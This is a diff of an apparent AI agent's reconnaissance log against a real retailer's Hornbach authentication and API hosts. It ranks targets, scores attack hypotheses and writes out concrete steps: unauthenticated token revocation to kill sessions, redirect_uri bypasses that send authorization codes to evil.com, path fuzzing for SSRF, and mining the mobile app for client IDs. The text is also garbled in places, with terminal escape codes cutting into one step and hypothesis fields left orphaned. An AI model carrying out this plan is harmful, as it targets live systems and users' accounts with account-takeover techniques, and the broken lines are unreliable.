@@ -1,7 +1,13 @@
-## 2026-09-07 06:14:47 UTC [target] (model nemotron3)
+## 2026-09-07 12:52:39 UTC [target] (model nemotron3)
+[CHANGED] auth.hornbach.com/token-srv/introspect: probe-results.md shows 15 consecutive GET probes returning 404 (latest 2026-09-07 06:15), but KB confirms POST → 200 `{"active":false}` unauthenticated across 9+ independent sessions; method mismatch (GET vs POST) is the delta
+[CHANGED] auth.hornbach.com/token-srv/revoke: probe-results.md shows 15 consecutive GET probes returning 404 (latest 2026-09-07 06:15), but KB confirms POST → 200 `OK` unauthenticated across 9+ sessions; method mismatch (GET vs POST) is the delta
+[CHANGED] auth.hornbach.com/authz-srv/authz: probe-results.md shows 200 responses with `<valid_client_id>` placeholder; KB notes router-level deprecation signal (404 at 16:58Z 2026-09-06) but OIDC discovery still advertises endpoint; status uncertain
+[NEW] auth.hornbach.com/.well-known/openid-configuration: RE-CONFIRMED fully intact (2026-09-06 06:30Z) — all 6 service endpoints + status advertised; rejects metadata-rot flag
+[CHANGED] api.hornbach.de: 13+ common API paths exhausted (graphql, openapi, swagger, actuator, sap/*) — all uniform 404 (47 bytes); anonymous surface breadth definitively exhausted per KB
+[CHANGED] auth.hornbach.de/nitro/v1/config: 302 → /logon/LogonPoint/tmindex.html — NetScaler management API confirmed NOT exposed unauthenticated
 [PRIO] auth.hornbach.com/token-srv/{introspect,revoke}, 8.35, attack_surface=9 business_value=8 tech_exposure=8 gate_ease=10 cloud_surface=5 freshness=9
 [PRIO] auth.hornbach.com/authz-srv/authz, 6.20, attack_surface=7 business_value=9 tech_exposure=6 gate_ease=3 cloud_surface=4 freshness=6
-[PRIO] api.hornbach.de, 6.15, attack_surface=6 business_value=8 tech_exposure=5 gate_ease=5 cloud_surface=8 freshness=7
+[PRIO] api.hornbach.de, 5.80, attack_surface=6 business_value=8 tech_exposure=5 gate_ease=5 cloud_surface=8 freshness=5
 [PRIO] auth.hornbach.de, 5.10, attack_surface=5 business_value=7 tech_exposure=4 gate_ease=4 cloud_surface=3 freshness=6
 [PRIO] hornbach-mp.mirakl.net, 5.05, attack_surface=5 business_value=7 tech_exposure=4 gate_ease=2 cloud_surface=4 freshness=6
 [HYP] Unauthenticated token introspection + revocation enables silent session kill + metadata leak
@@ -10,14 +16,7 @@ asset: auth.hornbach.com/token-srv/{introspect,revoke}
 confidence: 85
 reasoning: Both endpoints RE-CONFIRMED live via POST returning 200 unauthenticated across 9+ independent sessions — introspect returns `{"active":false}`, revoke returns `OK`; RFC 7009/7662 violation pattern systemic; endpoints only respond to POST with application/x-www-form-urlencoded body (GET/HEAD return 404); token-srv/token requires client_auth (400 invalid_client), isolating flaw to introspect/revoke
 evidence_needed: Valid access_token to demonstrate revocation of active session; confirm session kill on subsequent introspect/userinfo call; verify introspect returns token metadata for active tokens (not just active=false)
-verify_steps: 1) POST https://auth.hornbach.com/token-srv/introspect -H "Content-Type: application/x-www-form-urlencoded" -d "token=<valid_token>" — observe 200 with token metadata; 2) POST https://auth.hornbach.com/token-srv/revoke -H "Content-Type: application/x-www-form-urlencoded" -d "token=<valid_token>&token_type_hint=access_token" — observe 200 OK without client auth; 3) Verify session killed by attempting to use revoked token at userinfo endpoint
-impact: Silent session revocation → individual account DoS; combined with token theft: steal → revoke → user forced re-auth → attacker intercepts; introspect leaks token metadata (scopes, client_id, exp, sub) for active tokens (AUTH class, MEDIUM-HIGH)
-testability: AUTH_HELPED
-[HYP] OAuth redirect_uri validation bypass via regex/wildcard mismatch on authz-srv/authz
-class: OATH
-asset: auth.hornbach.com/authz-srv/authz
-confidence: 65
-reasoning: Authorization endpoint historically returned HTTP 200 login/consent page for valid client_id; latest probe (16:58Z) shows 404 suggesting router-level deprecation; OIDC discovery still advertises authz-srv/authz; cidaas CIAM may use regex/wildcard matching for redirect_uri allowlists; redirect_uri parameter accepted before client validation per OAuth flow
+verify_steps: 1) POST https://auth.hornbach.com/token-srv/introspect -H "Content-Type: application/x-www-form-urlencoded" -d "token=<valid_token>" — observe 200 with token metadata; 2) POST https://auth.hornbach.com/token-srv/revoke -H "Content-Type: application/x-www-form-urlencoded" -d "token=<valid_token>&token_type_hint=access_token" — observe [0m← [0mWrite analyst-out.txt
 evidence_needed: Valid client_id + redirect_uri variations (https://evil.com, https://hornbach.de.evil.com, https://hornbach.de@evil.com, path traversal /..;/evil.com) accepted and authorization code delivered to attacker URI
 verify_steps: 1) Obtain valid client_id from HORNBACH mobile app (de.hornbach) OAuth config or hornbach.de frontend JS after bypassing bot challenge; 2) GET https://auth.hornbach.com/authz-srv/authz?response_type=code&client_id=<valid_client_id>&redirect_uri=https://evil.com&scope=openid — observe if 302 to evil.com with code; 3) Test redirect_uri variations if login page returned
 impact: OAuth authorization code theft → access/refresh tokens → full account takeover (OATH class, HIGH)
@@ -25,16 +24,16 @@ testability: AUTH_HELPED
 [HYP] SSRF to localhost:8080 backend via SAP API Gateway route manipulation
 class: SSRF
 asset: api.hornbach.de
-confidence: 45
+confidence: 40
 reasoning: SAP API Gateway (Gateway server header, X-CorrelationID) fronts backend on localhost:8080 (leaked via /healthcheck Host header); Gateway returns structured JSON/XML errors; undocumented routes may exist for mobile/b2b/internal integrations; SAP APIM supports dynamic routing to internal services; 13+ common API paths tested — all 404 uniform
 evidence_needed: Hidden endpoint returns 200 with API functionality (GraphQL introspection, REST resources, Swagger/OpenAPI spec) OR SSRF via backend route parameter (e.g., /api/internal/metadata, /actuator/gateway/routes)
 verify_steps: 1) Fuzz common API paths with wordlist (feroxbuster -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u https://api.hornbach.de); 2) Test GraphQL introspection on /graphql, /api/graphql, /v1/graphql; 3) Check for OpenAPI spec at /openapi.json, /swagger.json, /api-docs; 4) Probe Spring Actuator /actuator/gateway/routes for route disclosure
 impact: Undocumented API access → data exposure, BOLA/IDOR, business logic flaws; SSRF to localhost:8080 → internal service metadata, cloud credentials (SSRF class, HIGH)
 testability: PASSIVE
-[PARKED] SSRF to localhost:8080 backend via SAP API Gateway route manipulation: confidence 45 below actionable threshold; fuzzing-only verify steps with no specific target; SSRF requires discoverable controllable parameter; no evidence of SSRF vector yet; 13+ paths exhausted with uniform 404
+[PARKED] SSRF to localhost:8080 backend via SAP API Gateway route manipulation: confidence 40 below actionable threshold; fuzzing-only verify steps with no specific target; SSRF requires discoverable controllable parameter; no evidence of SSRF vector yet; 13+ paths exhausted with uniform 404
 [FINAL] Unauthenticated token introspection + revocation enables silent session kill + metadata leak (confidence 85, AUTH_HELPED, MEDIUM-HIGH)
 [FINAL] OAuth redirect_uri validation bypass via regex/wildcard mismatch on authz-srv/authz (confidence 65, AUTH_HELPED, HIGH)
-[NEXT] HUMAN: Download HORNBACH mobile app (de.hornbach) APK from APKMirror/Google Play, extract OAuth config (client_id + redirect_uri scheme) from assets/cidaas.xml or strings.xml — required prerequisite for OAuth redirect_uri validation testing on authz-srv/authz and for obtaining tokens to test revocation/introspection endpoints
+[NEXT] PROBE: POST https://auth.hornbach.com/token-srv/introspect -H "Content-Type: application/x-www-form-urlencoded" -d "token=<dummy>" — confirm POST method returns 200 vs GET 404; validates methodology artifact per KB (read-only, no auth, parameter-safe)
 [LEARN] ACCEPTED class AUTH @ auth.hornbach.com/token-srv/introspect: RE-CONFIRMED POST → 200 `{"active":false}` unauthenticated — 9th session; GET/HEAD returning 404 was methodology artefact
 [LEARN] ACCEPTED class AUTH @ auth.hornbach.com/token-srv/revoke: RE-CONFIRMED POST → 200 `OK` unauthenticated — stable text/plain response; GET/HEAD returning 404 was parameter-sensitive routing
 [LEARN] ACCEPTED class OATH @ auth.hornbach.com/authz-srv/authz: authorization endpoint live with verbose error messages; redirect_uri validation testing requires valid client_id
